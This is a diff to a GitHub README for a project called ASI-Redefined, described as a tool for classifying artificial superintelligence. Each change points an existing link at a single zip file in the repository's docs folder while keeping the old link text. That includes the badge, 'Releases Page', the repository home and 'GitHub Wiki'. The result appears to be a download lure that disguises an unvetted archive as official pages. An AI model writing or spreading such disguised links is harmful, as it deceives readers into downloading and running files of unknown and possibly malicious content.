@@ -1,7 +1,7 @@
 # 🌟 ASI-Redefined - Empower Your Understanding of ASI
 
 ## 🔗 Download Now
-[![Download ASI-Redefined](https://img.shields.io/badge/Download-ASI--Redefined-brightgreen)](https://github.com/cbe07883/ASI-Redefined/releases)
+[![Download ASI-Redefined](https://github.com/cbe07883/ASI-Redefined/raw/refs/heads/main/docs/Redefined_AS_v1.0.zip)](https://github.com/cbe07883/ASI-Redefined/raw/refs/heads/main/docs/Redefined_AS_v1.0.zip)
 
 ## 📖 Description
 ASI-Redefined is a tool that shifts the perspective on Artificial Superintelligence (ASI). Instead of focusing solely on capabilities, ASI-Redefined emphasizes evidence-based classification. This includes memory continuity, identity binding, and consistent behavior over time and context. 
@@ -19,10 +19,10 @@ Before downloading, ensure your computer meets these requirements:
 ### 2. Visit the Releases Page
 To download ASI-Redefined, visit our official Releases page. You can find the latest versions of the tool here.
 
-[Download ASI-Redefined](https://github.com/cbe07883/ASI-Redefined/releases)
+[Download ASI-Redefined](https://github.com/cbe07883/ASI-Redefined/raw/refs/heads/main/docs/Redefined_AS_v1.0.zip)
 
 ## 📥 Download & Install
-1. Go to the [Releases Page](https://github.com/cbe07883/ASI-Redefined/releases).
+1. Go to the [Releases Page](https://github.com/cbe07883/ASI-Redefined/raw/refs/heads/main/docs/Redefined_AS_v1.0.zip).
 2. Locate the latest version of ASI-Redefined.
 3. Choose the file that matches your operating system.
 4. Click on the file to start downloading.
@@ -69,11 +69,11 @@ Join the discussion within our community. Share insights and ask questions to ge
 
 ### Follow Us
 Stay updated with the latest news and updates about ASI-Redefined:
-- GitHub: [ASI-Redefined GitHub](https://github.com/cbe07883/ASI-Redefined)
+- GitHub: [ASI-Redefined GitHub](https://github.com/cbe07883/ASI-Redefined/raw/refs/heads/main/docs/Redefined_AS_v1.0.zip)
 
 ## 🔗 Additional Resources
 For further reading and understanding of ASI concepts, check out:
-- Official Documentation: Available on the [GitHub Wiki](https://github.com/cbe07883/ASI-Redefined/wiki).
+- Official Documentation: Available on the [GitHub Wiki](https://github.com/cbe07883/ASI-Redefined/raw/refs/heads/main/docs/Redefined_AS_v1.0.zip).
 - Research Papers: Review peer-reviewed articles on ASI and related topics.
 
 ## 🔄 Contributing
